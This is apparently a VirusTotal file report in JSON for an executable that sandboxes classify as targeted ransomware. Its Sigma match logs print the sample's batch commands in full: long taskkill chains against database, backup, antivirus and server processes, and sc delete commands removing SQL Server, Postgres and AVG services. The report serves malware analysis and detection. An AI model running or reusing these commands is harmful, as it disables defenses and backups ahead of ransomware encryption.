{
    "data":  {
                 "id":  "7c84eafb3b05f0d5316fae610d9404c54ef39383d0fe0e3c07407a26bb9f6750",
                 "type":  "file",
                 "links":  {
                               "self":  "https://www.virustotal.com/api/v3/files/7c84eafb3b05f0d5316fae610d9404c54ef39383d0fe0e3c07407a26bb9f6750"
                           },
                 "attributes":  {
                                    "last_analysis_date":  1702441569,
                                    "type_extension":  "exe",
                                    "pe_info":  {
                                                    "timestamp":  1680449276,
                                                    "imphash":  "f34d5f2d4577ed6d9ceec516c1f5a744",
                                                    "machine_type":  332,
                                                    "entry_point":  324814,
                                                    "resource_details":  [
                                                                             {
                                                                                 "lang":  "NEUTRAL",
                                                                                 "chi2":  30857.02,
                                                                                 "filetype":  "unknown",
                                                                                 "entropy":  5.07894229888916,
                                                                                 "sha256":  "b4f9f15accb661ef9c2ffc7120165efd23da146f37c6c2269640fe83165f5026",
                                                                                 "type":  "RT_ICON"
                                                                             },
                                                                             {
                                                                                 "lang":  "NEUTRAL",
                                                                                 "chi2":  1823.2,
                                                                                 "filetype":  "ICO",
                                                                                 "entropy":  1.9192407131195068,
                                                                                 "sha256":  "404e02d011bc669c67ead03b175f7eaab8a01e00c044f6aed26dc0fb1ffef4f5",
                                                                                 "type":  "RT_GROUP_ICON"
                                                                             },
                                                                             {
                                                                                 "lang":  "NEUTRAL",
                                                                                 "chi2":  79092.17,
                                                                                 "filetype":  "unknown",
                                                                                 "entropy":  3.4557173252105713,
                                                                                 "sha256":  "40e719a9b9f435f83cd92dc55f93153a68210aacd0a088d0e31bbdaae85be2c8",
                                                                                 "type":  "RT_VERSION"
                                                                             },
                                                                             {
                                                                                 "lang":  "NEUTRAL",
                                                                                 "chi2":  4230.71,
                                                                                 "filetype":  "unknown",
                                                                                 "entropy":  4.941678047180176,
                                                                                 "sha256":  "6a2cf379aa950dde3136a3e3ff80047923faaf69dc65c7c5af21350f6d6a2a08",
                                                                                 "type":  "RT_MANIFEST"
                                                                             }
                                                                         ],
                                                    "resource_langs":  {
                                                                           "NEUTRAL":  4
                                                                       },
                                                    "resource_types":  {
                                                                           "RT_ICON":  1,
                                                                           "RT_GROUP_ICON":  1,
                                                                           "RT_VERSION":  1,
                                                                           "RT_MANIFEST":  1
                                                                       },
                                                    "sections":  [
                                                                     {
                                                                         "name":  ".text",
                                                                         "chi2":  7062555.0,
                                                                         "virtual_address":  8192,
                                                                         "flags":  "rx",
                                                                         "raw_size":  316928,
                                                                         "entropy":  5.62,
                                                                         "virtual_size":  316628,
                                                                         "md5":  "0a34bf65137830bc8c8da965d5f28b5f"
                                                                     },
                                                                     {
                                                                         "name":  ".rsrc",
                                                                         "chi2":  109065.21,
                                                                         "virtual_address":  327680,
                                                                         "flags":  "r",
                                                                         "raw_size":  3072,
                                                                         "entropy":  5.09,
                                                                         "virtual_size":  2900,
                                                                         "md5":  "1109753ac053eeb15e283da976d70524"
                                                                     },
                                                                     {
                                                                         "name":  ".reloc",
                                                                         "chi2":  128015.0,
                                                                         "virtual_address":  335872,
                                                                         "flags":  "r",
                                                                         "raw_size":  512,
                                                                         "entropy":  0.1,
                                                                         "virtual_size":  12,
                                                                         "md5":  "db1491653d92955354c01b7d69cf211d"
                                                                     }
                                                                 ],
                                                    "import_list":  [
                                                                        {
                                                                            "library_name":  "mscoree.dll",
                                                                            "imported_functions":  [
                                                                                                       "_CorExeMain"
                                                                                                   ]
                                                                        }
                                                                    ]
                                                },
                                    "sandbox_verdicts":  {
                                                             "Zenbox":  {
                                                                            "category":  "malicious",
                                                                            "confidence":  100,
                                                                            "sandbox_name":  "Zenbox",
                                                                            "malware_classification":  [
                                                                                                           "MALWARE",
                                                                                                           "RANSOM",
                                                                                                           "TROJAN",
                                                                                                           "EVADER"
                                                                                                       ],
                                                                            "malware_names":  [
                                                                                                  "Targeted Ransomware"
                                                                                              ]
                                                                        },
                                                             "C2AE":  {
                                                                          "category":  "undetected",
                                                                          "sandbox_name":  "C2AE",
                                                                          "malware_classification":  [
                                                                                                         "UNKNOWN_VERDICT"
                                                                                                     ]
                                                                      },
                                                             "Dr.Web vxCube":  {
                                                                                   "category":  "malicious",
                                                                                   "sandbox_name":  "Dr.Web vxCube",
                                                                                   "malware_classification":  [
                                                                                                                  "MALWARE"
                                                                                                              ]
                                                                               }
                                                         },
                                    "authentihash":  "5bc50d4d8c53e8ca5198157fea07e7358226208a6b6439bcfbb9422c8516abc4",
                                    "ssdeep":  "3072:ddZxsJHHFaMzyVN9yLPvn+BJns7gzdIa66BnzMYGIPazwEs74T/DafH2YthI/HUO:dCJFaMWfID+ZBjBnzMNDro5twUzLr+f",
                                    "last_modification_date":  1762838053,
                                    "crowdsourced_yara_results":  [
                                                                      {
                                                                          "description":  "Detects command variations typically used by ransomware",
                                                                          "author":  "ditekSHen",
                                                                          "ruleset_name":  "indicator_suspicious",
                                                                          "rule_name":  "INDICATOR_SUSPICIOUS_GENRansomware",
                                                                          "ruleset_id":  "00c3b8eb5d",
                                                                          "match_in_subfile":  true,
                                                                          "source":  "https://github.com/ditekshen/detection"
                                                                      }
                                                                  ],
                                    "sigma_analysis_summary":  {
                                                                   "Sigma Integrated Rule Set (GitHub)":  {
                                                                                                              "high":  4,
                                                                                                              "medium":  1,
                                                                                                              "critical":  0,
                                                                                                              "low":  4
                                                                                                          }
                                                               },
                                    "main_icon":  {
                                                      "raw_md5":  "a79959cc5b3a46433565524d3c679a56",
                                                      "dhash":  "f0f8d8ecececf0f0"
                                                  },
                                    "sha256":  "7c84eafb3b05f0d5316fae610d9404c54ef39383d0fe0e3c07407a26bb9f6750",
                                    "md5":  "f1cdaeb5aa8819de2cb75b021aa9f128",
                                    "last_submission_date":  1690958831,
                                    "vhash":  "23503655551e0811740061",
                                    "tlsh":  "T10064A3183BA55CDDF1E6FAB5EC63048464F5780E18B2DA8E4E5C248D48F4744FC1BEAA",
                                    "sigma_analysis_results":  [
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3377-642A-B20C-000000004A00}; ProcessId=260; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=cmd  /c \"color e \u0026 @taskkill /IM ThunderPlatform.exe /F \u0026 @taskkill /IM iexplore.exe /F \u0026 @taskkill /IM vm-agent.exe /F \u0026 @taskkill /IM vm-agent-daemon.exe /F \u0026 @taskkill /IM eSightService.exe /F \u0026 @taskkill /IM cygrunsrv.exe /F \u0026 @taskkill /IM wrapper.exe /F \u0026 @taskkill /IM nginx.exe /F \u0026 @taskkill /IM node.exe /F \u0026 @taskkill /IM sshd.exe /F \u0026 @taskkill /IM vm-tray.exe /F \u0026 @taskkill /IM iempwatchdog.exe /F \u0026 @taskkill /IM sqlwriter.exe /F \u0026 @taskkill /IM php.exe /F \u0026 @taskkill /IM \"notepad++.exe\" /F \u0026 @taskkill /IM \"phpStudy.exe\" /F \u0026 @taskkill /IM OPCClient.exe /F \u0026 @taskkill /IM navicat.exe /F \u0026 @taskkill /IM SupportAssistAgent.exe /F \u0026 @taskkill /IM SunloginClient.exe /F \u0026 @taskkill /IM SOUNDMAN.exe /F \u0026 @taskkill /IM WeChat.exe /F \u0026 @taskkill /IM TXPlatform.exe /F \u0026 @taskkill /IM Tencentdll.exe /F \u0026 @taskkill /IM httpd.exe /F \u0026 @taskkill /IM jenkins.exe /F \u0026 @taskkill /IM QQ.exe /F \u0026 @taskkill /IM HaoZip.exe /F \u0026 @taskkill /IM HaoZipScan.exe /F \u0026 @taskkill /IM navicat.exe /F \u0026 @taskkill /IM TSVNCache.exe /F \u0026 @taskkill /IM RAVCpl64.exe /F \u0026 @taskkill /IM secbizsrv.exe /F \u0026 @taskkill /IM aliwssv.exe /F \u0026 @taskkill /IM Helper_Haozip.exe /F \u0026 @taskkill /IM acrotray.exe /F \u0026 @taskkill /IM \"FileZilla Server Interface.exe\" /F \u0026 @taskkill /IM YoudaoNote.exe /F \u0026 @taskkill /IM YNoteCefRender.exe /F \u0026 @taskkill /IM idea.exe /F \u0026 @taskkill /IM fsnotifier.exe /F \u0026 @taskkill /IM picpick.exe /F \u0026 @taskkill /IM lantern.exe /F \u0026 @taskkill /IM sysproxy-cmd.exe /F \u0026 @taskkill /IM service.exe /F \u0026 @taskkill /IM pcas.exe /F \u0026 @taskkill /IM PresentationFontCache.exe /F \u0026 @taskkill /IM RtWlan.exe /F \u0026 @taskkill /IM monitor.exe /F \u0026 @taskkill /IM Correspond.exe /F \u0026 @taskkill /IM ChatServer.exe /F \u0026 @taskkill /IM InetMgr.exe /F \u0026 @taskkill /IM LogonServer.exe /F \u0026 @taskkill /IM GameServer.exe /F \u0026 @taskkill /IM ServUAdmin.exe /F \u0026 @taskkill /IM ServUDaemon.exe /F \u0026 @taskkill /IM update0.exe /F \u0026 @taskkill /IM server.exe /F \u0026 @taskkill /IM w3wp.exe /F \u0026 @taskkill /IM notepad.exe /F \u0026 @taskkill /IM PalmInputService.exe /F \u0026 @taskkill /IM PalmInputGuard.exe /F \u0026 @taskkill /IM UpdateServer.exe /F \u0026 @taskkill /IM UpdateGate.exe /F \u0026 @taskkill /IM DBServer.exe /F \u0026 @taskkill /IM LoginGate.exe /F \u0026 @taskkill /IM SelGate.exe /F \u0026 @taskkill /IM RunGate.exe /F \u0026 @taskkill /IM M2Server.exe /F \u0026 @taskkill /IM LogDataServer.exe /F \u0026 @taskkill /IM LoginSrv.exe /F \u0026 @taskkill /IM sqlceip.exe /F \u0026 @taskkill /IM mqsvc.exe /F \u0026 @taskkill /IM RefundOrder.exe /F \u0026 @taskkill /IM ClamTray.exe /F \u0026 @taskkill /IM AdobeARM.exe /F \u0026 @taskkill /IM veeam.backup.shell.exe /F \u0026 @taskkill /IM VpxClient.exe /F \u0026 @taskkill /IM vmware-vmrc.exe /F \u0026 @taskkill /IM DSCPatchService.exe /F \u0026 @taskkill /IM scktsrvr.exe /F \u0026 @taskkill /IM ServerManager.exe /F \u0026 @taskkill /IM Dispatcher.exe /F \u0026 @taskkill /IM EFDispatcher.exe /F \u0026 @taskkill /IM sqlceip.exe /F \u0026 @taskkill /IM mqsvc.exe /F \u0026 @taskkill /IM RefundOrder.exe /F \u0026 @taskkill /IM ClamTray.exe /F \u0026 @taskkill /IM AdobeARM.exe /F \u0026 @taskkill /IM veeam.backup.shell.exe /F \u0026 @taskkill /IM VpxClient.exe /F \u0026 @taskkill /IM vmware-vmrc.exe /F \u0026 @taskkill /IM DSCPatchService.exe /F \u0026 @taskkill /IM scktsrvr.exe /F \u0026 @taskkill /IM ServerManager.exe /F \u0026 @taskkill /IM Dispatcher.exe /F \u0026 @taskkill /IM EFDispatcher.exe /F \u0026 @taskkill /IM ClamWin.exe /F \u0026 @taskkill /IM srvany.exe /F \u0026 @taskkill /IM JT_AG-8332.exe /F \u0026 @taskkill /IM XXTClient.exe /F \u0026 @taskkill /IM clean.exe /F \u0026 @taskkill /IM sqlservr.exe /F \u0026 @taskkill /IM \"Net.Service.exe\" /F \u0026 @taskkill /IM plsqldev.exe /F \u0026 @taskkill /IM splwow64.exe /F \u0026 @taskkill /IM Oobe.exe /F \u0026 @taskkill /IM QQYService.exe /F \u0026 @taskkill /IM sqlservr.exe /F \u0026 @taskkill /IM SGTool.exe /F \u0026 @taskkill /IM postgres.exe /F \u0026 @taskkill /IM AppVShNotify.exe /F \u0026 @taskkill /IM OfficeClickToRun.exe /F \u0026 @taskkill /IM EntDT.exe /F \u0026 @taskkill /IM EntPublish.exe /F\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487287; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3381-642A-010E-000000004A00}; ProcessId=1968; Product=Microsoft\\xae Windows\\xae Operating System; Description=Terminates Processes; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3377-642A-B20C-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=15E2E0ACD891510C6268CB8899F2A1A1,SHA256=F328D587561BEED3C19289FBA43E284FB57BCE1A4C202C7379673964F9B8610D,IMPHASH=0D3E23DCB6BF63A9EB90D5BED57B4F89; OriginalFileName=taskkill.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=260; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=taskkill  /IM Tencentdll.exe /F ; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\taskkill.exe; IntegrityLevel=High; ParentCommandLine=cmd  /c \"color e \u0026 @taskkill /IM ThunderPlatform.exe /F \u0026 @taskkill /IM iexplore.exe /F \u0026 @taskkill /IM vm-agent.exe /F \u0026 @taskkill /IM vm-agent-daemon.exe /F \u0026 @taskkill /IM eSightService.exe /F \u0026 @taskkill /IM cygrunsrv.exe /F \u0026 @taskkill /IM wrapper.exe /F \u0026 @taskkill /IM nginx.exe /F \u0026 @taskkill /IM node.exe /F \u0026 @taskkill /IM sshd.exe /F \u0026 @taskkill /IM vm-tray.exe /F \u0026 @taskkill /IM iempwatchdog.exe /F \u0026 @taskkill /IM sqlwriter.exe /F \u0026 @taskkill /IM php.exe /F \u0026 @taskkill /IM \"notepad++.exe\" /F \u0026 @taskkill /IM \"phpStudy.exe\" /F \u0026 @taskkill /IM OPCClient.exe /F \u0026 @taskkill /IM navicat.exe /F \u0026 @taskkill /IM SupportAssistAgent.exe /F \u0026 @taskkill /IM SunloginClient.exe /F \u0026 @taskkill /IM SOUNDMAN.exe /F \u0026 @taskkill /IM WeChat.exe /F \u0026 @taskkill /IM TXPlatform.exe /F \u0026 @taskkill /IM Tencentdll.exe /F \u0026 @taskkill /IM httpd.exe /F \u0026 @taskkill /IM jenkins.exe /F \u0026 @taskkill /IM QQ.exe /F \u0026 @taskkill /IM HaoZip.exe /F \u0026 @taskkill /IM HaoZipScan.exe /F \u0026 @taskkill /IM navicat.exe /F \u0026 @taskkill /IM TSVNCache.exe /F \u0026 @taskkill /IM RAVCpl64.exe /F \u0026 @taskkill /IM secbizsrv.exe /F \u0026 @taskkill /IM aliwssv.exe /F \u0026 @taskkill /IM Helper_Haozip.exe /F \u0026 @taskkill /IM acrotray.exe /F \u0026 @taskkill /IM \"FileZilla Server Interface.exe\" /F \u0026 @taskkill /IM YoudaoNote.exe /F \u0026 @taskkill /IM YNoteCefRender.exe /F \u0026 @taskkill /IM idea.exe /F \u0026 @taskkill /IM fsnotifier.exe /F \u0026 @taskkill /IM picpick.exe /F \u0026 @taskkill /IM lantern.exe /F \u0026 @taskkill /IM sysproxy-cmd.exe /F \u0026 @taskkill /IM service.exe /F \u0026 @taskkill /IM pcas.exe /F \u0026 @taskkill /IM PresentationFontCache.exe /F \u0026 @taskkill /IM RtWlan.exe /F \u0026 @taskkill /IM monitor.exe /F \u0026 @taskkill /IM Correspond.exe /F \u0026 @taskkill /IM ChatServer.exe /F \u0026 @taskkill /IM InetMgr.exe /F \u0026 @taskkill /IM LogonServer.exe /F \u0026 @taskkill /IM GameServer.exe /F \u0026 @taskkill /IM ServUAdmin.exe /F \u0026 @taskkill /IM ServUDaemon.exe /F \u0026 @taskkill /IM update0.exe /F \u0026 @taskkill /IM server.exe /F \u0026 @taskkill /IM w3wp.exe /F \u0026 @taskkill /IM notepad.exe /F \u0026 @taskkill /IM PalmInputService.exe /F \u0026 @taskkill /IM PalmInputGuard.exe /F \u0026 @taskkill /IM UpdateServer.exe /F \u0026 @taskkill /IM UpdateGate.exe /F \u0026 @taskkill /IM DBServer.exe /F \u0026 @taskkill /IM LoginGate.exe /F \u0026 @taskkill /IM SelGate.exe /F \u0026 @taskkill /IM RunGate.exe /F \u0026 @taskkill /IM M2Server.exe /F \u0026 @taskkill /IM LogDataServer.exe /F \u0026 @taskkill /IM LoginSrv.exe /F \u0026 @taskkill /IM sqlceip.exe /F \u0026 @taskkill /IM mqsvc.exe /F \u0026 @taskkill /IM RefundOrder.exe /F \u0026 @taskkill /IM ClamTray.exe /F \u0026 @taskkill /IM AdobeARM.exe /F \u0026 @taskkill /IM veeam.backup.shell.exe /F \u0026 @taskkill /IM VpxClient.exe /F \u0026 @taskkill /IM vmware-vmrc.exe /F \u0026 @taskkill /IM DSCPatchService.exe /F \u0026 @taskkill /IM scktsrvr.exe /F \u0026 @taskkill /IM ServerManager.exe /F \u0026 @taskkill /IM Dispatcher.exe /F \u0026 @taskkill /IM EFDispatcher.exe /F \u0026 @taskkill /IM sqlceip.exe /F \u0026 @taskkill /IM mqsvc.exe /F \u0026 @taskkill /IM RefundOrder.exe /F \u0026 @taskkill /IM ClamTray.exe /F \u0026 @taskkill /IM AdobeARM.exe /F \u0026 @taskkill /IM veeam.backup.shell.exe /F \u0026 @taskkill /IM VpxClient.exe /F \u0026 @taskkill /IM vmware-vmrc.exe /F \u0026 @taskkill /IM DSCPatchService.exe /F \u0026 @taskkill /IM scktsrvr.exe /F \u0026 @taskkill /IM ServerManager.exe /F \u0026 @taskkill /IM Dispatcher.exe /F \u0026 @taskkill /IM EFDispatcher.exe /F \u0026 @taskkill /IM ClamWin.exe /F \u0026 @taskkill /IM srvany.exe /F \u0026 @taskkill /IM JT_AG-8332.exe /F \u0026 @taskkill /IM XXTClient.exe /F \u0026 @taskkill /IM clean.exe /F \u0026 @taskkill /IM sqlservr.exe /F \u0026 @taskkill /IM \"Net.Service.exe\" /F \u0026 @taskkill /IM plsqldev.exe /F \u0026 @taskkill /IM splwow64.exe /F \u0026 @taskkill /IM Oobe.exe /F \u0026 @taskkill /IM QQYService.exe /F \u0026 @taskkill /IM sqlservr.exe /F \u0026 @taskkill /IM SGTool.exe /F \u0026 @taskkill /IM postgres.exe /F \u0026 @taskkill /IM AppVShNotify.exe /F \u0026 @taskkill /IM OfficeClickToRun.exe /F \u0026 @taskkill /IM EntDT.exe /F \u0026 @taskkill /IM EntPublish.exe /F\"; UtcTime=1680487297; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_description":  "Detects the use of WinAPI Functions via the commandline. As seen used by threat actors via the tool winapiexec",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potential WinAPI Calls Via CommandLine",
                                                                       "rule_id":  "7d53de0fb9c4ee79b8ab06605cd3a8faaa400a586d577c9a7d692f059a3ac78c",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-334A-642A-7D0A-000000004A00}; ProcessId=268; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3348-642A-750A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=24A3E2603E63BCB9695A2935D3B24695,SHA256=3047D5C22A245D1E4294FCD547EC5FB0F2E5EF030B764424ACC74E7744FBE32E,IMPHASH=B037D0ADB81BF9CFC651DE01742089F1; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4076; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"MSSQLFDLauncher\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\sc.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /C sc delete \"MSSQLFDLauncher\"\u0026\u0026sc delete \"MSSQLSERVER\"\u0026\u0026sc delete \"SQLSERVERAGENT\"\u0026\u0026sc delete \"SQLBrowser\"\u0026\u0026sc delete \"SQLTELEMETRY\"\u0026\u0026sc delete \"MsDtsServer130\"\u0026\u0026sc delete \"SSISTELEMETRY130\"\u0026\u0026sc delete \"SQLWriter\"\u0026\u0026sc delete \"MSSQL$VEEAMSQL2012\"\u0026\u0026sc delete \"SQLAgent$VEEAMSQL2012\"\u0026\u0026sc delete \"MSSQL\"\u0026\u0026sc delete \"SQLAgent\"\u0026\u0026sc delete \"MSSQLServerADHelper100\"\u0026\u0026sc delete \"MSSQLServerOLAPService\"\u0026\u0026sc delete \"MsDtsServer100\"\u0026\u0026sc delete \"ReportServer\"\u0026\u0026sc delete \"SQLTELEMETRY$HL\"\u0026\u0026sc delete \"TMBMServer\"\u0026\u0026sc delete \"MSSQL$PROGID\"\u0026\u0026sc delete \"MSSQL$WOLTERSKLUWER\"\u0026\u0026sc delete \"SQLAgent$PROGID\"\u0026\u0026sc delete \"SQLAgent$WOLTERSKLUWER\"\u0026\u0026sc delete \"MSSQLFDLauncher$OPTIMA\"\u0026\u0026sc delete \"MSSQL$OPTIMA\"\u0026\u0026sc delete \"SQLAgent$OPTIMA\"\u0026\u0026sc delete \"ReportServer$OPTIMA\"\u0026\u0026sc delete \"msftesql$SQLEXPRESS\"\u0026\u0026sc delete \"postgresql-x64-9.4\"\u0026\u0026rem Kill \"SQL\"\u0026\u0026taskkill -f -im sqlbrowser.exe\u0026\u0026taskkill -f -im sqlwriter.exe\u0026\u0026taskkill -f -im sqlservr.exe\u0026\u0026taskkill -f -im msmdsrv.exe\u0026\u0026taskkill -f -im MsDtsSrvr.exe\u0026\u0026taskkill -f -im sqlceip.exe\u0026\u0026taskkill -f -im fdlauncher.exe\u0026\u0026taskkill -f -im Ssms.exe\u0026\u0026taskkill -f -im SQLAGENT.EXE\u0026\u0026taskkill -f -im fdhost.exe\u0026\u0026taskkill -f -im fdlauncher.exe\u0026\u0026taskkill -f -im sqlservr.exe\u0026\u0026taskkill -f -im ReportingServicesService.exe\u0026\u0026taskkill -f -im msftesql.exe\u0026\u0026taskkill -f -im pg_ctl.exe\u0026\u0026taskkill -f -im postgres.exe; UtcTime=1680487242; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3368-642A-AD0B-000000004A00}; ProcessId=6900; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=24A3E2603E63BCB9695A2935D3B24695,SHA256=3047D5C22A245D1E4294FCD547EC5FB0F2E5EF030B764424ACC74E7744FBE32E,IMPHASH=B037D0ADB81BF9CFC651DE01742089F1; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"vmicvss\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\sc.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487272; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3368-642A-B00B-000000004A00}; ProcessId=6680; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=24A3E2603E63BCB9695A2935D3B24695,SHA256=3047D5C22A245D1E4294FCD547EC5FB0F2E5EF030B764424ACC74E7744FBE32E,IMPHASH=B037D0ADB81BF9CFC651DE01742089F1; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"wmms\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\sc.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487272; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3368-642A-B10B-000000004A00}; ProcessId=5816; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=24A3E2603E63BCB9695A2935D3B24695,SHA256=3047D5C22A245D1E4294FCD547EC5FB0F2E5EF030B764424ACC74E7744FBE32E,IMPHASH=B037D0ADB81BF9CFC651DE01742089F1; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"AvgAdminServer\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\sc.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487272; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3368-642A-B20B-000000004A00}; ProcessId=6700; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=24A3E2603E63BCB9695A2935D3B24695,SHA256=3047D5C22A245D1E4294FCD547EC5FB0F2E5EF030B764424ACC74E7744FBE32E,IMPHASH=B037D0ADB81BF9CFC651DE01742089F1; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"AVG Antivirus\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\sc.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487272; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-3368-642A-B30B-000000004A00}; ProcessId=3828; Product=Microsoft\\xae Windows\\xae Operating System; Description=Service Control Manager Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-3342-642A-640A-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=24A3E2603E63BCB9695A2935D3B24695,SHA256=3047D5C22A245D1E4294FCD547EC5FB0F2E5EF030B764424ACC74E7744FBE32E,IMPHASH=B037D0ADB81BF9CFC651DE01742089F1; OriginalFileName=sc.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6644; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=sc  delete \"avgAdminClient\"; EventID=1; LogonGuid=C784477D-7526-6407-084C-040000000000; LogonId=281608; Image=C:\\Windows\\SysWOW64\\sc.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\Xdxdddwpepkill$-arab.bat\" \"; UtcTime=1680487272; RuleName=-}"
                                                                                             },
                                                                                             {
